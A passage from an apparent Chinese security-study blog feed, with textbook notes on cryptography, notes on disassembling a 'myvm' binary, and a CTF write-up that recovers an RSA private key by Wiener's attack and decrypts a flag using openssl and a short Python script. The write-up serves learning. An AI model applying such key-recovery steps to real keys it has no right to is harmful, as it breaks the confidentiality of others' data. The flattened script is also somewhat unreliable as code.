**“椭圆上离散对数问题”**。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**椭圆曲线 Diffie-Hellman 密钥交换能够用较短的密钥长度实现较高的安全性。** 五、基于口令的密码（PBE） 1.什么是基于口令的密码？&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;基于口令的密码就是一种根据口令生成密钥并用该密钥进行加密的方法，加密和解密使用同一个密钥。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在使用基于口令的密码时（PBE），需要将盐和加密后的 CEK 通过物理方式进行保护。2.如何理解 PBE 的意义？3. PBE 加密的过程4. PBE 解密的过程5. 盐（salt）的作用 盐是由伪随机数生成器生成的随机数 盐是用来防御字典攻击的 6. 如何让通过拉伸来改良 PBE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;拉伸在这里的意思就是通过多次使用单向散列函数来多次迭代计算盐和口令。 六、生成安全的口令的方法 **1.使用只有自己才知道的信息** **2.将多个不同的口令分开使用** **3.有效利用笔记** **4.理解口令的局限性** **5.使用口令生成和管理工具**]]></content>
      <tags>
        <tag>Crypto</tag>
        <tag>《图解密码技术》学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《图解密码技术》第十章学习笔记]]></title>
    <url>%2F2019%2F05%2F21%2F2019.05.21%EF%BC%8860%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一、证书（PKC） 1.什么是证书？&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;公钥证书（PKC，Public Key Certificate）包含了个人的公钥、姓名、组织、邮箱、地址等个人信息，是由认证机构（CA，Certification Authority）施加数字签名。这里的认证机构就是能够认定“公钥确实属于此人”并能够生成数字签名的个人或者组织2.证书的应用场景在上图的过程中，我们需要注意一点：步骤（2）中Trent在收到Bob的公钥后，Trent会确认Bob公钥的真实性，也就是这个公钥是否为Bob本人所有，这个确认的过程就需要“身份确认和认证业务准则” 3.Symantec证书的内容&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在VeriSign颁发的证书中包含了如下的消息： VeriSign 颁发的证书，对自己的公钥进行认证； VeriSign 颁发的证书，对Symantec的公钥进行认证； VeriSign 颁发的证书，对“公钥用户”的公钥进行认证； 4.证书标准规范&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;目前使用最广泛的证书标准规范是由ITU（International Telecommunication Union，国际电信联盟）和 ISO（International Organization for Standardization，国际标准化组织）制定的 X.509 规范，X.509证书所包含的要素如下： 二、公钥基础设施（PKI） **1.什么是公钥基础设施？** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;公钥基础设施（PKI，Public Key Infrastructure）是为了能过够有效地**运用公钥**而制定的一系列**规格和规范**的总称，并非指某一个单独的规格和规范。 **2.PKI 的基本组成要素是什么？** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PKI的基本组成要素主要有 3 个： ![](http://r.photo.store.qq.com/psb?/V11UAV0k0TKwM6/Zq5zODDD6*C65wYmXGy4LVbcbSHBIrhcR4ynHY8ygTw!/r/dL4AAAAAAAAA) **用户**：使用 PKI 的实体。用户包括两种，一种是希望**使用 PKI 注册自己的公钥的人**，另一种是希望**使用已注册的公钥的**人。 **认证机构（CA**）：颁发证书的实体，并对证书进行管理。① CA 可以为用户生成密钥对，也可以使用用户自己生成的密钥对；② 在注册公钥时对本人身份进行认证；③ 生成并颁发证书；④ 作废证书 CRL； **仓库**：保存证书的数据库，也叫做证书目录 **3.PKI 与 CA 的关系是什么？** &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**PKI是一个基于公私钥算法的身份认证体系**，由权威认证机构(CA)、证书注册系统（RA）、数字证书库、密钥备份及恢复系统（KM）、应用接口（API）等基本构成部分。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**CA是 PKI 最关键的部分**，是信任的源。负责数字证书的申请、签发、更新、冻结、解冻、废除、发布CRL等 **4.认证机构（CA）的工作** - **生成密钥对**：① 由 PKI 用户自行生成；② 由认证机构来生成； - **注册证书**：① 申请证书所使用的规范是由 RFC2986（PKCS #10：Certification Request Syntax Specification Version 1.7）；② 生成证书的格式是**由 X.509 来定义**的； - **作废证书与CRL**：① 要作废证书，CA 要制作一张**证书作废清单**，简称CRL；② 要想查询证书是否有效，不能仅凭**是否在有效期、是否有合法的认证机构的签名**，还需要**查询认证机构最新的CRL**，并确认该证书是否有效，查询 CRL 是由处理该证书的软件来完成，但是很多软件更新CRL并不是很及时，因此会产生 CRL 攻击； &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;认证机构（CA）只要对公钥进行签名就行了，因此任何人都可以成为CA 5.证书的层级结构&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于认证机构的公钥，我们如何确保其公钥的真实性呢？可以由其他的认证机构施加数自签名，从而对认证机构的公钥进行验证，即生成一张认证机构的公钥证书。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在验证公钥的时候，需要从最高级的认证机构（根CA）开始，然后依次往下验证； 三、对证书的攻击 1.在公钥注册之前进行攻击：对施加数字签名之前的公钥进行攻击； 2.注册相似人名进行攻击 3.窃取认证机构的私钥进行攻击 4.攻击者伪装成认证机构进行攻击 5.利用CRL的空子进行攻击（1）：利用CRL发布的时间差来发动攻击，其应对对策为： 当公钥实效时尽快通知认证机构； 尽快发布CRL 及时更新CRL 6.利用CRL的空子进行攻击（2）：否认自己发送的信息，防止这种攻击，人们设计了一种OCSP协议 四、一些重要的语句 1.为了确保机密性我们需要密钥，为了解决密钥的配送问题我们需要公钥密码，为了确保完整性我们有了消息码，为了防止否认我们需要数字签名，为了防止公钥被伪造我们需要证书。由此可见在这一信任的链条中，最后的终点是“**对根CA的信任**” 2.如果认证机构本身不可信，即便证书合法，其中的公钥也不能使用 3.如果能够取得可信的公钥，则不需要认证机构；当持有可信的认证机构公钥，并相信认证机构所进行的身份确认的情况下，则可以信任该认证机构颁发的证书以及通过该途径得到的公钥 4.其实这一章主要的内容就是在** "如何保证公钥的真实性” **]]></content>
      <tags>
        <tag>Crypto</tag>
        <tag>《图解密码技术》学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《图解密码技术》第九章学习笔记]]></title>
    <url>%2F2019%2F05%2F20%2F2019.05.20%EF%BC%8859%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一、数字签名 1.数字签名是一种相当于现实世界中的盖章，它的功能在计算机世界中进行实现的技术；2.数字签名的功能：保证数据的完整性，还可以防止否认 3.数字签名和消息验证码的区别：4.公钥密码和数字签名的联系：☛ 公钥密码是用公钥加密，私钥解密☛ 数字签名是用私钥加密，公钥解密。之所以将公钥签名的逆过程说成数字签名，是因为只有签名者拥有私钥，而其他人不可能拥有 二、数字签名的方法 数字签名的方法有两种：☛ 直接对消息签名的方法☛ 对消息的散列值签名的方法 三、对数字签名的疑问 密文为什么具备签名的意义？数字签名是利用了“没有私钥的人事实上无法生成使用该私钥所生成的密文”这一性质来实现的。而这里所生成的密文并非被用于保证机密性，而是被用于代表一种只有持有密钥的人才能够生成的信息。 数字签名可以被任意复制吗？签名可以被复制，但并不意味者签名就没有意义，即便签名被复制，也并不会改变签名者和消息的内容。签名是不是原件并不重要，真正重要的是特定的签名者与特定的消息绑定在了一起这一事实。 消息内容会不会被任意修改？当然可以被任意修改，但是被修改以后验证签名就会失败。 四、数字签名的应用实例 安全信息公告 软件下载 公钥证书 SSL/TLS 五、其他的数字签名 ElGamal 利用了在 mod N 中求离散对数的困难度，可以被用于公钥密码和数字签名 DSA 是一种数字签名算法 ECDSA 是一种利用椭圆曲线密码来实现的数字签名算法 Rabin 利用了在 mod N 中求平方根的困难度 六、对数字签名的攻击1.中间人攻击 对数字签名的中间人攻击，具体来说就是主动攻击者 Mallory介入发送者和接收者的中间，对发送者伪装成接收者，对接收者伪装成发送者，从而能够在无需破解数字签名算法的前提下完成攻击。 2.对单向散列函数的攻击 数字签名所使用的单向散列函数必须具有抗碰撞性。 3.利用数字签名攻击公钥密码 最重要的是绝对不要对意思不清楚的消息签名，尤其是不要对看起来只是随机数据的消息进行签名。 4.潜在伪造 什么叫做潜在伪造？即使签名的对象是无意义的消息（比如随机比特序列），如果攻击者能够生成合法的数字签名（即攻击者生成的签名能够正常通过校验），我们也应当将其当成是对这种签名算法的一种潜在威胁，这种情况称为对数字的潜在伪造 预防攻击对策为了应对潜在伪造，人们在改良RSA的基础上开发出了一种签名算法，叫做RSA-PSS。RSA-PSS并不是对消息本身签名，而是对其散列值进行签名。另外，为了提高安全性，在计算散列值的时候还要对消息加盐（salt） 七、混合密码系统对散列值签名 1.对于混合密码中的各种技术的应用，我们可以这样理解： 消息本身是用对称密码加密的； 对称密码的密钥使用公钥密码加密的； 在混合密码中对称密码的密钥相当于消息； 2.对于数字签名中的各种技术的应用，我们可以这样理解： 消息本身输入单向散列函数，得到散列值； 对散列值进行签名（私钥加密）； 在数字签名中，散列值相当于消息 综上所述： 对称密码的密钥是机密性的精华； 单向散列函数的散列值是完整性的精华； 八、数字签名无法解决的问题 使用数字签名可以实现的功能有：识别出篡改和伪装，还可以防止否认；也就是说同时实现了消息的完整性、进行认证已经防止否认；但是正确使用数字签名需要在一个大前提下：用于验证签名的公钥必须属于真正的发送者。为了确认自己的得到的公钥是否合法，我们需要证书（第三方，PKI）]]></content>
      <tags>
        <tag>Crypto</tag>
        <tag>《图解密码技术》学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《图解密码技术》第八章学习笔记]]></title>
    <url>%2F2019%2F05%2F16%2F2019.05.16%EF%BC%8858%EF%BC%89%2F</url>
    <content type="text"><![CDATA[一、消息认证码 1、消息认证码是一种确认完整性并进行认证的技术，MAC（Message Authentication Code）2、消息认证码的输入包括：任意长度的消息和一个共享的密钥（在接收者和发送者之间）3、消息认证码的输出是一个固定长度的值，这个数据就是MAC4、它与单向散列函数的区别（密钥）：它是一种与密钥相关的单行散列函数5、消息认证码的步骤： 二、消息验证码的应用实例 1、SWIFT：Society for Worldwide Interbank Financial Telecommunications2、IPsec：对IP协议增加安全性的一种方式3、SSL/TLS 三、消息认证码的实现方法 1、使用单向散列函数实现——HMAC2、使用密码分组实现：例如AES-CMAC就是一种基于 AES 来实现的消息验证码3、其他方法：流密码和公钥密码等 四、认证加密 1、认证加密是一种将对称密码和消息认证码相结合的技术，同时满足三个功能“机密性”、“完整性”、“认证”2、认证加密的方式： Encrypt-then-MAC Encrypt-and-MAC MAC-then-Encrypt GCM：使用AES等128bit分组密码的CTR模式，并使用一个反复加法和乘法运算的散列函数来计算MAC的值 说 明：由于CTR模式加密与MAC值的计算使用的是相同的密钥，因此在密钥管理方面也更加容易，专门用于消息认证码的GCM成为CMAC 五、HMAC的详细介绍 1、HMAC是一种使用单向散列函数来构造消息认证码的方法。（H代表的意思就是Hash）2、任何高强度的单向散列函数都可以被用于HMAC：HMAC-SHA1、HMAC-SHA-224、HMAC-SHA-256、HMAC-SHA-384、HMAC-SHA-5123、HMAC的具体步骤： 六、对消息认证码的攻击 1、重放攻击：并不会破解消息认证码MAC，而是将它保存下来并加以利用；&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;防止重放攻击的策略：① 序号 ② 时间戳 ③ nonce（一次性的随机数）2、密钥推测攻击：暴力破解、生日攻击 七、消息认证码无法解决的问题 1、对第三方的证明（数字签名来解决）2、防止否认（也是用数字签名来解决）]]></content>
      <tags>
        <tag>Crypto</tag>
        <tag>《图解密码技术》学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[304号测试解题总结（一）]]></title>
    <url>%2F2019%2F05%2F15%2F2019.05.15%EF%BC%8857%EF%BC%89%2F</url>
    <content type="text"><![CDATA[✍ 分析了两天myvm汇编指令的指令格式和寻址方式，今天就简单的来总结一下有关内容。因为本人的知识有限，所以在总结的过程可能会出现许多错误，希望大家能够在评论区给我留言，我将及时验证并更正。 一、myvm汇编代码（main函数部分）1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162.text:0000000000000BD0.text:0000000000000BD0 ; =============== S U B R O U T I N E =======================================.text:0000000000000BD0.text:0000000000000BD0.text:0000000000000BD0 ; int __cdecl main(int, char **, char **).text:0000000000000BD0 main proc near ; DATA XREF: start+1Do.text:0000000000000BD0 push r14.text:0000000000000BD2 push rbx.text:0000000000000BD3 push rax.text:0000000000000BD4 mov rbx, rsi.text:0000000000000BD7 cmp edi, 2.text:0000000000000BDA jnz short loc_C47.text:0000000000000BDC lea rsi, handler ; handler.text:0000000000000BE3 mov edi, 2 ; sig.text:0000000000000BE8 call signal.text:0000000000000BED mov rdi, [rbx+8].text:0000000000000BF1 call sub_CE0.text:0000000000000BF6 mov rbx, rax.text:0000000000000BF9 lea r14, unk_202014.text:0000000000000C00 mov dword ptr [r14], 1.text:0000000000000C07 nop word ptr [rax+rax+00000000h].text:0000000000000C10.text:0000000000000C10 loc_C10: ; CODE XREF: main+50j.text:0000000000000C10 mov rdi, rbx.text:0000000000000C13 call sub_E90.text:0000000000000C18 test eax, eax.text:0000000000000C1A jnz short loc_C24.text:0000000000000C1C cmp dword ptr [r14], 0.text:0000000000000C20 jnz short loc_C10.text:0000000000000C22 jmp short loc_C35.text:0000000000000C24 ; ---------------------------------------------------------------------------.text:0000000000000C24.text:0000000000000C24 loc_C24: ; CODE XREF: main+4Aj.text:0000000000000C24 cmp eax, 2.text:0000000000000C27 jnz short loc_C35.text:0000000000000C29 lea rdi, s ; &quot;Illegal Instruction&quot;.text:0000000000000C30 call puts.text:0000000000000C35.text:0000000000000C35 loc_C35: ; CODE XREF: main+52j.text:0000000000000C35 ; main+57j.text:0000000000000C35 mov rdi, rbx.text:0000000000000C38 call nullsub_2.text:0000000000000C3D.text:0000000000000C3D loc_C3D: ; CODE XREF: main+92j.text:0000000000000C3D xor eax, eax.text:0000000000000C3F add rsp, 8.text:0000000000000C43 pop rbx.text:0000000000000C44 pop r14.text:0000000000000C46 retn.text:0000000000000C47 ; ---------------------------------------------------------------------------.text:0000000000000C47.text:0000000000000C47 loc_C47: ; CODE XREF: main+Aj.text:0000000000000C47 mov rax, cs:stderr_ptr.text:0000000000000C4E mov rdi, [rax] ; stream.text:0000000000000C51 mov rdx, [rbx].text:0000000000000C54 lea rsi, format ; &quot;Usage: %s &lt;myvm program&gt;\n&quot;.text:0000000000000C5B xor eax, eax.text:0000000000000C5D call fprintf.text:0000000000000C62 jmp short loc_C3D.text:0000000000000C62 main endp.text:0000000000000C62.text:0000000000000C62 ; --------------------------------------------------------------------------- 二、所含指令总结 以上就是myvm程序main函数的汇编指令，在分析了上述指令后，简单的来总结一下所包含的指令以及其功能： push：实现压入操作的指令； mov：详细见以前的总结； cmp：是微型机中的一条比较指令，功能相当于减法指令，但不改变数值； jnz：这是跳转指令，详细见以前的总结； lea：取有效地址，也就是取偏移地址； call：“调用”指令，其功能有：① 将下一条指令的所在地址（即当时程序计数器PC的内容）入栈；② 将子程序的起始地址送入PC（于是CPU的下一条指令就会转去执行子程序）； nop：执行到NOP指令时，CPU什么也不做，仅仅当做一个指令执行过去并继续执行NOP后面的一条指令。所以NOP指令自然也会占用执行一个指令的CPU时间片 test：将两个操作数进行逻辑与运算，并根据运算结果设置相关的标志位。但是，Test命令的两个操作数不会被改变。运算结果在设置过相关标记位后会被丢弃。 jmp：这是跳转指令，详细见以前的总结； xor：逻辑运算符——异或 add：相加的指令； pop：将堆栈段中的一个字单元弹出； retn：返回”指令，RET指令的功能就是一条：从栈中取出一条数据送入PC； 三、汇编指令的逻辑 在总结以上的指令外，我也将汇编指令反编译成伪代码，然后找出了伪代码和汇编指令的对应部分，如下图： 四、寻址方式（main函数） 【知识储备】 有关寻址的总结，我在以前的博文里有所叙述，详情可以点击这里。 这篇文章是一位博主总结的，比较详细 对于myvm的main函数来说，主要的寻址方式有：（目前我所知道的） 立即数寻址 寄存器寻址 段间间接寻址 五、学习感悟 这几天通过对myvm程序的分析，我发现前几天学到的知识点还远远不够，而且对于Virtual machine这道题目来说，我所欠缺的知识点还很多很多，我将继续脚踏实地的学习，不断补充自己。]]></content>
      <tags>
        <tag>解题总结</tag>
        <tag>Virtual machine</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[本科毕业论文问卷调查]]></title>
    <url>%2F2019%2F05%2F14%2F2019.05.14%EF%BC%8856%EF%BC%89%2F</url>
    <content type="text"><![CDATA[因为我在本科论文中需要一些数据，关于消费者的消费行为分析的，希望大家能够帮我填写一下： 致谢：感谢我身边所有的人，是你们在我前进的路上帮助了我，我也希望在以后的路上我们一起走过，一起去面对困难和挑战！]]></content>
      <tags>
        <tag>本科论文</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[304号测试学习笔记（一）]]></title>
    <url>%2F2019%2F05%2F13%2F2019.05.13%EF%BC%8855%EF%BC%89%2F</url>
    <content type="text"><![CDATA[☛ 前言：好多天就开始做Virtual machine了，但是自己前天才把题目给的文件给解压出来（一开始没看懂文件的类型），觉得这件事真的好丢人，于是这两天我好好的为Virtual machine这道题目做了大量的功课，学习了一下这道题目有关的知识点，今天就重点来介绍一下这两天来学习的内容。 一、知识清单 汇编器 反汇编器 基于寄存器的的虚拟机 x86指令编码格式解析 二、知识详解1.汇编器 在做过二进制炸弹的题目后，我其实对汇编器有了大概的了解，但是发现内容还是不够详细，前天又对汇编器做了一下总结：汇编器（Assembler）是将汇编语言翻译为机器语言的程序。一般而言，汇编生成的是目标代码，需要经链接器（Linker）生成可执行代码才可以执行。主要的汇编器： MASM编译器：MASM是Microsoft公司推出的汇编编译器。每次升级除了例行的错误修正外都增加了一些新的功能，向下兼容性也不好。低版本的MASM固然无法编译高版本的源程序，但高版本的MASM也可能无法正常编译低版本的源程序，如MASM 4.0写的源程序常常无法在MASM 6.x上编译成功。在使用MASM系列编译器时，如果不先搞清楚特定的语法和编译选项可以在哪个版本上用，编译中就会错误连篇。 NASM编译器：NASM是一个为可移植性与模块化而设计的一个80x86的汇编器。它支持相当多的目标文件格式，包括Linux和’NetBSD/FreeBSD’,’a.out’,’ELF’,’COFF’,微软16位的’OBJ’和’Win32’。它还可以输出纯二进制文件。它的语法设计得相当的简洁易懂，和Intel语法相似但更简单。它支持’Pentium’,’P6’,’MMX’,’3DNow!’,’SSE’ and ‘SSE2’指令集. 汇编器和编译器的区别：汇编器（比如MASM）全称是汇编编译器，用来编译汇编语言的。汇编语言的大部分命令都和机器码一一对应，而高级语言和汇编的伪指令是不和机器码一一对应的 ，因此从某种意义上说，汇编码就相当于机器码。 编译器的作用是，将源文件（.c/.cpp/.pas等）转换为目标代码（.obj/.dcu等）。这是已经是二进制代码了。 最后由连接器（Linker），将目标代码连接起来，这样就形成了可执行文件 2.反汇编器 反汇编器是一种工具程序，可以将机器代码转换为目标处理器专用的汇编代码或汇编指令。就操作而言，反汇编就是汇编的逆过程。在Virtual machine这道题目中，需要我们自己用Capstone写一个反汇编器，对myvm程序进行反汇编。常见的反汇编器： IDA PRO反汇编器：该反汇编器就是我前面在解题时常用的工具，它是一个静态反编译的软件，是世界目前最顶级的反汇编软件 Capstone：它是Kali Linux自带的一款轻量级反汇编引擎。它可以支持多种硬件构架，如ARM、ARM64、MIPS、X86。该框架使用C语言实现，但支持C++、Python、Ruby、OCaml、C#、Java和Go语言，具有很好的扩展性。因此，该框架被256种工具所集成，如Cuckoo、Binwalk、IntelliJ IDEA。渗透测试人员可以通过Python、Ruby语言编写脚本，引入Capstone引擎，从而构建自己的反汇编工具。 3.基于寄存器的的虚拟机 基于寄存器的虚拟机运行机制：基于寄存器的虚拟机中没有操作数栈的概念，但是有很多虚拟寄存器，一般情况下这些寄存器（操作数）都是别名，需要执行引擎对这些寄存器（操作数）的解析，找出操作数的具体位置，然后取出操作数进行运算。既然是虚拟寄存器，那么肯定不在CPU中，其实和操作数栈相同，这些寄存器也存放在运行时栈中，本质上就是一个数组。以下内容参考网址为：基于寄存器与基于栈的虚拟机以Lua虚拟机为例：新的虚拟机也用栈分配活动记录，寄存器就在该活动记录中。当进入Lua程序的函数体时，函数从栈中分配一个足以容纳该函数所有寄存器的活动记录。函数的所有局部变量都各占据一个寄存器。因此，存取局部变量是相当高效的。上面就是Lua虚拟机对寄存器的相关描述，示意图如下：![](http://img.blog.csdn.net/20151218140426182)从上图中我们可以看到，其实“寄存器”的概念只是当前栈帧中一块连续的内存区域。这些数据在运算的时候，直接送入物理CPU进行计算，无需再传送到operand stack上然后再进行运算。例如”ADD R3, R2, R1”的示意图就如下所示：![](http://img.blog.csdn.net/20151218141034563)其实”ADD R3, R2, R1”还要经过译码的一个过程，当然当前这条指令的种类和操作数由虚拟机进行解释。后面我们会看到，在有些实现中，有一个很大的switch-case来进行指令的分派及真正的运算过程。使用寄存器式虚拟机没有基于栈的虚拟机在拷贝数据而使用的大量的出入栈（push/pop）指令。同时指令更紧凑更简洁。但是由于显示指定了操作数，所以基于寄存器的代码会比基于栈的代码要大，但是由于指令数量的减少，其实没有大多少。 4.x86指令编码格式解析 有x86指令编码的格式，我直接把下面的链接贴到这里，以供以后学习作为参考。 x86指令格式 x86指令编码格式-看雪论坛 x86指令编码格式解析 三、学习感悟 这两天的学习状态不是很好，对一些知识点的理解不够深入，掌握的不够牢固，这几天我要好好地调整一下，赶紧回到正常的学习状态，不能再处于这样低迷的状态了。 四、每日一句 知道问题在哪，就应该立即去解决！]]></content>
      <tags>
        <tag>Virtual machine</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《图解密码技术》第七章学习笔记]]></title>
    <url>%2F2019%2F05%2F11%2F2019.05.11%EF%BC%8854%EF%BC%89%2F</url>
    <content type="text"><![CDATA[☛ 前言：今天主要对《图解密码技术》的第七章进行了总结，前六章的笔记都写在了OneNote上面，以后我也会把以前的笔记迁移到博客上面来，那么今天主要写一下今天的学习笔记。 一、什么是单向散列函数 单向散列函数不同于加密技术，它不是对信息进行加密，而是为了证明数据的完整性，防止数据被篡改，但是无法辨别出“伪装”（这个需要认证技术） 单向散列函数有一个输入和一个输出，其中输入的叫做消息，输出称为散列值，而散列值的长度与消息的长度无关。 单向散列函数的性质： 根据任意长度的消息计算出固定长度的散列值 能够快速计算出散列值 消息不同散列值不同：两个不同的消息产生同一个散列值的情况称为碰撞☛ 弱抗碰撞性：单向散列函数必须确保要找到和该条消息具有相同散列值的另外一条消息是非常困难的，单向散列函数都必须具备弱抗碰撞性；☛ 强抗碰撞性：是指要找到散列值相同的两条不同的消息是非常困难的； 具备单向性 一些术语： 单向散列函数也称为消息摘要函数、哈希函数或者杂凑函数； 输入单向散列函数的消息也称为原像； 单向散列函数输出的散列值也称为消息摘要或者指纹； 完整性也称为一致性； 二、单向散列函数的应用 检测软件是否被篡改 基于口令的加密（PBE） 消息验证码 数字签名：先通过单向散列函数计算出消息的散列值，然后再对这个散列值施加数字签名 伪随机数生成器 一次性口令 三、单向散列函数的具体列子 MD4、MD5：结构是MD（Message Digest）结构 SHA-1、SHA-2（SHA-256、SHA-384、SHA-512）：SHA-256的上限接近264比特，SHA-384、SHA-512的上限接近2128比特， ROIPEMD-160：比特币使用的就是该算法； SHA-3 四、SHA-3的选拔过程 什么是SHA-32012年正式确定将Keccak算法作为SHA-3标准 SHA-3的选拔Keccak被选拔为SHA-3的理由如下: 采用了与SHA-2完全不同的结构 结构清晰，易于分析 能够使用各种设备，也适用于嵌入式应用 在硬件上的实现显示出了很高的性能 比其他最终候选算法安全性边际更大 五、Keccak 什么是Keccak它是一种被选定为SHA-3标准的单向散列函数，并且输入数据的长度没有上限 海绵结构☛ 吸收阶段&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① f 的作用：将输入的数据进行复杂的搅拌操作并输出结果，输入和输出的长度均为 b = r + c bit&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② 每次吸收的长度为 r 个比特，因此 r 被称为比特率&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;③ 函数 f 的输入长度不是 r 个比特，而是 r + c个比特，这就意味着内部状态中有 c 个比特是不受输入分组内容的直接影响的，这里的 c 被称为容量，容量 c 的意义在于防止将输入消息中的一些特征泄露出去☛ 挤出阶段&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;① 输出值为 r + c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;② 无论是吸收阶段还是挤出阶段，函数 f 的逻辑本身是完全相同的 双工结构 Keccak的内部状态（海面结构） xy 平面称为slice，yz 平面称为sheet，xz 平面称为plane Keccak本质是实现一个能够将上述结构的 state 进行有效搅拌的函数 f 可以看成是由与 lane 的长度相同数量的 slice 堆叠而成的 函数Keccak-f[b] b 称为宽度，通过改变宽度 b 就可以改变内部状态的长度，改变的是 lane 的长度，但不能改变slice（5 x 5） Keccak 的结构成为套娃结构 Keccak-f[b] 总共循环 12 + 2ζ 轮，每一轮包含 5 个步骤：θ（西塔）、ρ（柔）、π（派）、χ（凯）、ι（伊欧塔）而步骤 ι 是用一个固定的轮常数对整个 state 的所有比特进行XOR运算，目的是为了让内部状态具备非对称性]]></content>
      <tags>
        <tag>Crypto</tag>
        <tag>《图解密码技术》学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Wiener Trick解题总结]]></title>
    <url>%2F2019%2F05%2F09%2F2019.05.09%EF%BC%8853%EF%BC%89%2F</url>
    <content type="text"><![CDATA[☛ 前言：前天对Wiener攻击相关的知识点进行了详细总结，但是因为Hexo中Mathjax的渲染问题，导致上一篇博文的数学公式出现了问题，昨天也对该问题进行了探索，但是截至目前位置该问题还没有得到解决，今天我先把昨天博文正确的格式放到上篇的末尾，以后我再对该问题进行解决，今天就先总结一下Wiener Ttick 这道题目的解题步骤吧！ 一、前期准备 openssl 的用法 Wiener 攻击原理（见上篇博文） 连分数知识（见上篇博文） python 脚本（该脚本是github上的） 二、思考过程1.该题的解题思路是什么样的？ 在上个月我曾做了一道这样的RSA题目：已知公钥，用私钥对密文进行解密。那个题目主要的步骤就是“如何从公钥得到私钥”（详情请点击这里），在那道题目我们是通过分解整数 N ，得到 p 和 q ，进而得到私钥（n，d）。Wiener Trick 这道题目也是给了一个公钥，让我们通过公钥求私钥，进而对密文进行解密，但是该题的公钥中的 n 和 e ，远远大于RSA2那道题目的长度，那么这道题目是不是也可以用这个思路进行呢？如果不可以的话，还可以用什么方法进行解密呢？ 2.如何从公钥中得到 n 和 e ？ 题目中的公钥格式只有—-Begin Public Key—- —-End Public Key—- 里面的内容，没有 n 和 e 的数据，那么应该如何得到这两个参数呢？ 三、实验过程1.对“思考二”进行实验 很早之前，我也对openssl的用法进行了总结，但是通过这两次的题目，我意识到那次的总结还有很多地方没有总结，缺漏了很多知识点，以后有时间我将继续完善 openssl 的用法。在查阅了很多有关的资料后，我发现openssl有一个用法，可以从—-Begin Public Key—- —-End Public Key—-中解析出 n 和 e ，这条命令就是： openssl rsa -modulus -in Public.pem -out Public.txt -pubin -text这样一来，我们就得到了 n 和 e 两个数值：其中 n 的十进制长度是309，e 的十进制长度是309 2.对“思考一”进行实验 在这个验证过程中，我们就是要实验一下，以前的方法对这道题是否还适用。于是我先进行了第一步：将 n 进行分解。由于 n 很大的缘故，我在分解的过程中，可能需要很长的时间，如下图：看到需要这么长的时间，我果断的放弃了“大数分解”这个思路，那么我必须还要换一种方式，得到私钥（n，d），我又对题目的名称进行了搜索，发现了Wiener攻击的方法，于是有了昨天对这种方法的总结。那么下面我用这个方法来解这道题目。 四、解题过程1.将公钥解析出 n 和 e 如上图所示，我们可以成功的将 n 和 e 解析出来。 2.利用脚本计算出 d 这道题目中求 d 的脚本，我是用的GitHub上的WienerAttack脚本，有可能的话我会自己写一个脚本。对脚本进行修改直接在主函数中调用 hack_RSA( ) 函数，得到如下的结果： 3.利用脚本生成私钥（no—padding） 该脚本还是 RSA2 的那个脚本：12345678910111213import mathimport sysfrom Crypto.PublicKey import RSA RSAkey = RSA.generate(1024) RSAkey.e = 355949428044394011416525580640727209012115496460578082591540362115366141425837528189633616844162877584613018030741854275756897461200378167436571547815767157785675778909581575938939615940299471388870845995538439614911452236868092605005352109203362643524505566443025399407973408444593940143560487529347856187923RSAkey.n = 949603686045205715277174628136022115711156979860824039383799385101249348289935491073325953355239683776503155414384435860534465117430864566291387794089216559280434116213181181405857171075971236007710276483079389558212315153404594351264107147803340895025164316798193753138427414374746336511224920322316865644907 RSAkey.d = 93076836824908620642628594590464850812511038475673825979968428923835223225430811644363358529 private = open(&apos;private.pem&apos;,&apos;w&apos;)private.write(RSAkey.exportKey()) 我们对生成的私钥进行验证，也就是通过该私钥生成公钥，然后与题目中的公钥进行对比：可以看出，两个公钥的信息完全相同，由此说明生成的私钥是正确的。 4.用私钥对密文进行解密 openssl rsautl -in flag.enc -inkey private.pem -out flag.txt -decrypt -raw得到的结果会有乱码，可以对其进行设置，便可得到flag； 五、学习感悟 通过这道题目，可以给我一个很好的启示：通过不断地学习，对以前学的知识进行思考和总结，以及查漏补缺。我缺的就是这种学习精神，不懂得去反思，去回顾。 六、每日一句 有望得到的要努力，无望得到的不介意，则无论输赢姿态都会好看。]]></content>
      <tags>
        <tag>解题总结</tag>
        <tag>RSA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Wiener Trick解题准备]]></title>
    <url>%2F2019%2F05%2F07%2F2019.05.07%EF%BC%8852%EF%BC%89%2F</url>
